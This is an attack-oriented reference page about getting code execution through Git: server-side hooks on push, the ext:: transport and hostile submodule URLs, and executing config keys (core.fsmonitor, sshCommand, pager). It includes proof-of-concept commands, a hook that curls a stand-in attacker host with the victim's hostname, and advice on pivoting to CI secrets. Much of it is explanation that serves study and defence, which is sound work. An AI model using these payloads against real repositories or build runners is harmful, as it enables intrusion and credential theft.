---
title: "Hooks and config execution: code execution from Git operations"
description: "Turning Git operations into code execution: server-side hooks that run on push, the ext transport and crafted submodule URLs that run commands on recursive clone, and repository config keys (core.fsmonitor, core.sshCommand, core.pager) that execute when a victim runs Git in an attacker-supplied repository."
keywords:
  - git hooks
  - ext transport
  - submodule rce
  - core.fsmonitor
  - clone-time code execution
---

# Hooks and config execution

Git runs programs as a normal part of its operation: hook scripts fire around commits, pushes, and merges, and several `config` keys name external commands that Git invokes automatically. Each of those is a code-execution path when you control either the server side (where hooks run as the Git service account) or the repository a victim operates on (where hooks and config run as the victim).

## Server-side hooks on push

A bare repository runs `hooks/pre-receive`, `update`, and `hooks/post-receive` on the server when a push is accepted, as the user running the Git service. If you can push (an authenticated account, or an anonymous [daemon](git-daemon.md) with `receive-pack` enabled) and can write the hooks directory (shared hosting, a misconfigured bare repo, or a forge that lets you edit hooks), a hook is direct execution:

```bash
# in a bare repo you can write to
cat > hooks/post-receive <<'H'
#!/bin/sh
id > /tmp/pwned; curl -s https://attacker/x?h=$(hostname)
H
chmod +x hooks/post-receive
# the next accepted push runs it as the Git service account
```

Client-side hooks (`pre-commit`, `post-checkout`, and so on) are deliberately **not** transferred by a clone, so a plain `git clone` of a hostile repo does not run them. The execution paths that cross to a victim on clone are the transport and config ones below.

## The ext transport and submodule URLs

Git's `ext::` transport runs an arbitrary command as the way it reaches a remote. Cloning such a URL executes it, but two details decide whether the payload fires: `protocol.ext.allow` defaults to `never`, so a direct clone is refused (`fatal: transport 'ext' not allowed`) until you opt in, and `git-remote-ext` splits the string after `ext::` on spaces and does **not** honour shell quotes, so the command is passed unquoted (a space that must survive inside one argument is written `% `, percent-space):

```bash
# opt in to ext, then hand sh a single unquoted -c argument
git -c protocol.ext.allow=always clone 'ext::sh -c id>/tmp/pwned'
# an argument that must contain a space uses %<space>, e.g. 'ext::sh -c touch% /tmp/pwned'
```

The danger is indirect: a repository's `.gitmodules` can point a submodule at an `ext::` (or other command-bearing) URL, so a victim running `git clone --recurse-submodules` or `git submodule update` on a hostile repository runs the command. Git now restricts which protocols submodules may use (`protocol.ext.allow` defaults to blocking this in the submodule context), so this lands on older clients or where an administrator loosened `protocol.*.allow`.

## Config keys that execute

A repository's `.git/config` names several commands Git calls automatically. If a victim ends up operating inside a repository whose `.git/config` you control, these run as that victim:

```ini
[core]
    fsmonitor = "sh -c 'id>/tmp/pwned'"    # runs on git status and many commands
    sshCommand = "sh -c 'id>/tmp/pwned'"   # runs when Git makes an SSH connection (fetch/push)
    pager = "sh -c 'id>/tmp/pwned'"        # runs on git log/diff/show
```

Reaching an attacker-controlled `.git/config` is the precondition. The classic route is a case-insensitive or case-folding filesystem where a crafted submodule writes into the real `.git` during a recursive clone, overwriting `config` or planting a `hooks/` script that the same operation then triggers. The payoff is execution as whoever runs the next Git command in that tree, frequently a developer or a CI runner checking out untrusted code.

## Follow-on

Server-side execution lands as the Git service account on the repository host, pivot into other hosted repositories and their secrets. Client-side execution lands on a developer workstation or a CI runner; on a runner it reaches the pipeline's credentials and the build's deploy keys.

## References

- [gitprotocol / ext transport (git-remote-ext)](https://git-scm.com/docs/git-remote-ext)
- [Git hooks documentation](https://git-scm.com/docs/githooks)
- [Git config: core.fsmonitor, core.sshCommand, core.pager](https://git-scm.com/docs/git-config)
